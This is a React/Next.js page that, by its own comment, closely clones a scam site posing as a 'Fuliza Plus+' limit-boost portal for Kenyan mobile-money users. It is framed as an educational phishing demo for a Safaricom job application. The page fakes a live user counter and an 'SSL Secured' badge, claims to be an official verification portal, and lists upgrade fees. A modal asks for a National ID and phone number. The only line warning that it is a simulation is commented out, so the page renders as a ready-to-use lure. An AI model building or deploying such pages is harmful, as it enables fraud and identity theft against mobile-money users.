'use client';
// src/app/page.tsx - Educational Demo Closely Matching ish-fuliza-boost.vercel.app

import React, { useState, useEffect } from 'react';

const formatKsh = (amount: number) => `Ksh ${amount.toLocaleString('en-KE')}`;

const limits = [
  { amount: 3000, fee: 250 },
  { amount: 5000, fee: 293 },
  { amount: 7500, fee: 350 },
  { amount: 10000, fee: 500 },
  { amount: 12500, fee: 747 },
  { amount: 16000, fee: 898 },
  { amount: 21000, fee: 1015 },
  { amount: 25500, fee: 1220 },
  { amount: 30000, fee: 1533 },
  { amount: 35000, fee: 1730 },
  { amount: 45000, fee: 2000 },
  { amount: 60000, fee: 2250 },
  { amount: 70000, fee: 2500 },
];

export default function IshFulizaBoostClone() {
  const [step, setStep] = useState<'hero' | 'loading' | 'eligible' | 'select' | 'final'>('hero');
  const [usersOnline, setUsersOnline] = useState(137);
  const [loadingMsg, setLoadingMsg] = useState('');
  const [selectedLimit, setSelectedLimit] = useState(limits[0]);
  const [showInputModal, setShowInputModal] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);

  // Live users online counter
  useEffect(() => {
    const interval = setInterval(() => {
      setUsersOnline((prev) => prev + Math.floor(Math.random() * 4) + 1);
    }, 2800);
    return () => clearInterval(interval);
  }, []);

  const loadingMessages = ["Connecting...", "Accessing secure databases..."];

  const handleCheckEligibility = () => {
    setStep('loading');
    let i = 0;
    const interval = setInterval(() => {
      setLoadingMsg(loadingMessages[i] || "Verifying account...");
      i++;
      if (i >= loadingMessages.length + 1) {
        clearInterval(interval);
        setTimeout(() => setStep('eligible'), 600);
      }
    }, 1300);
  };

  const handleProceedToUpgrade = () => {
    setStep('select');
  };

  const handleSelectLimit = (limit: typeof limits[0]) => {
    setSelectedLimit(limit);
    setShowInputModal(true);   // Light modal for demo (you can comment this out for exact match)
  };

  const handleFakeSubmit = () => {
    if (!phoneNumber || !idNumber) {
      alert("Please enter details (this is a demo only)");
      return;
    }
    setIsProcessing(true);
    setTimeout(() => {
      setIsProcessing(false);
      setShowInputModal(false);
      setStep('final');
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-emerald-50 to-white font-sans">
      {/* RED WARNING BANNER - KEEP FOR YOUR SAFARICOM PRESENTATION */}
      {/*<div className="bg-red-600 text-white py-3 text-center text-xs font-bold tracking-wide">
        🚨 EDUCATIONAL PHISHING DEMO ONLY — FOR SAFARICOM CYBERSECURITY JOB APPLICATION<br />
        DO NOT ENTER REAL INFORMATION — THIS IS A SIMULATION
      </div>*/}

      {/* Header */}
      <header className="bg-emerald-600 text-white py-3 px-4 flex justify-between items-center sticky top-0 z-50">
        <div className="font-bold text-2xl tracking-tight">Fuliza Plus+</div>
        <div className="text-sm flex items-center gap-4">
          <span><strong>{usersOnline}</strong> Users Online</span>
          <span className="flex items-center gap-1">🔒 SSL Secured</span>
        </div>
      </header>

      <div className="max-w-md mx-auto px-5 pt-8 pb-20">

        {/* HERO */}
        {step === 'hero' && (
          <div className="text-center">
            <h1 className="text-3xl font-bold text-emerald-700">Fuliza Plus+</h1>
            <p className="text-emerald-600 font-medium mt-1">Official Verification Portal</p>
            <p className="mt-6 text-gray-700">Verify your identity to unlock higher daily transaction limits.</p>

            <button
              onClick={handleCheckEligibility}
              className="mt-12 w-full bg-emerald-600 hover:bg-emerald-700 text-white py-5 rounded-2xl text-xl font-semibold shadow-xl transition"
            >
              Check My Eligibility
            </button>

            <div className="mt-16 text-xs text-gray-500 flex justify-center gap-8">
              <span>Instant Limit Increase</span>
              <span>•</span>
              <span>Same Day Access</span>
            </div>
          </div>
        )}

        {/* LOADING */}
        {step === 'loading' && (
          <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
            <div className="bg-white rounded-3xl p-12 w-80 text-center">
              <div className="animate-spin h-12 w-12 border-4 border-emerald-600 border-t-transparent rounded-full mx-auto"></div>
              <p className="mt-8 text-xl font-medium text-gray-800">{loadingMsg}</p>
            </div>
          </div>
        )}

        {/* ELIGIBLE RESULT */}
        {step === 'eligible' && (
          <div className="text-center">
            <div className="text-4xl mb-4">🎉</div>
            <h2 className="text-3xl font-bold text-emerald-700">Congratulations!</h2>
            <p className="mt-4 text-xl text-gray-800">High Trust Score Detected.</p>
            <p className="text-gray-700 mt-2">is eligible for a boost.</p>

            <button
              onClick={handleProceedToUpgrade}
              className="mt-12 w-full bg-emerald-600 hover:bg-emerald-700 text-white py-5 rounded-2xl text-xl font-semibold"
            >
              Proceed to Upgrade Limit
            </button>
          </div>
        )}

        {/* LIMIT SELECTION */}
        {step === 'select' && (
          <div>
            <h2 className="text-2xl font-semibold text-center text-emerald-700 mb-8">
              Select Your New Approved Limit
            </h2>
            <div className="grid grid-cols-2 gap-4">
              {limits.map((opt) => (
                <button
                  key={opt.amount}
                  onClick={() => handleSelectLimit(opt)}
                  className="bg-white border-2 border-emerald-100 hover:border-emerald-600 rounded-2xl p-6 text-left transition-all active:scale-95"
                >
                  <div className="text-2xl font-bold text-emerald-700">{formatKsh(opt.amount)}</div>
                  <div className="text-sm text-gray-500 mt-3">
                    Fee: {formatKsh(opt.fee)}
                  </div>
                </button>
              ))}
            </div>
            <p className="text-center text-xs text-gray-500 mt-10">SELECT A LIMIT</p>
          </div>
        )}

        {/* FINAL RESULT SCREEN */}
        {step === 'final' && (
          <div className="text-center py-12">
            <h2 className="text-3xl font-bold text-emerald-700">Limit will be boosted to</h2>
            <p className="text-7xl font-bold text-emerald-600 mt-6">Ksh 0</p>
            <p className="mt-8 text-red-500 text-sm">* Final amount depends on full verification</p>
          </div>
        )}
      </div>

      {/* Input Modal (Educational - shows how scams collect data) */}
      {showInputModal && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 px-4">
          <div className="bg-white rounded-3xl w-full max-w-md p-8">
            <h3 className="text-xl font-semibold text-center">Enter Details to Activate</h3>
            <p className="text-center text-sm text-gray-500 mt-2">{formatKsh(selectedLimit.amount)} Limit</p>

            <div className="mt-8 space-y-6">
              <div>
                <label className="block text-sm mb-2 font-medium">National ID Number</label>
                <input
                  type="text"
                  value={idNumber}
                  onChange={(e) => setIdNumber(e.target.value)}
                  placeholder="12345678"
                  className="w-full border rounded-2xl px-5 py-4 focus:border-emerald-600 outline-none"
                />
              </div>
              <div>
                <label className="block text-sm mb-2 font-medium">Phone Number</label>
                <div className="flex border rounded-2xl overflow-hidden focus-within:border-emerald-600">
                  <div className="bg-gray-100 px-5 py-4 text-gray-600">+254</div>
                  <input
                    type="tel"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    placeholder="712345678"
                    className="flex-1 px-5 py-4 outline-none"
                  />
                </div>
              </div>
            </div>

            <button
              onClick={handleFakeSubmit}
              disabled={isProcessing}
              className="mt-10 w-full bg-emerald-600 disabled:bg-gray-400 py-4 rounded-2xl text-white font-semibold text-lg"
            >
              {isProcessing ? "Processing..." : "Continue to Activation"}
            </button>

            <button onClick={() => setShowInputModal(false)} className="mt-4 w-full text-gray-500">
              Cancel
            </button>
          </div>
        </div>
      )}
    </div>
  );
}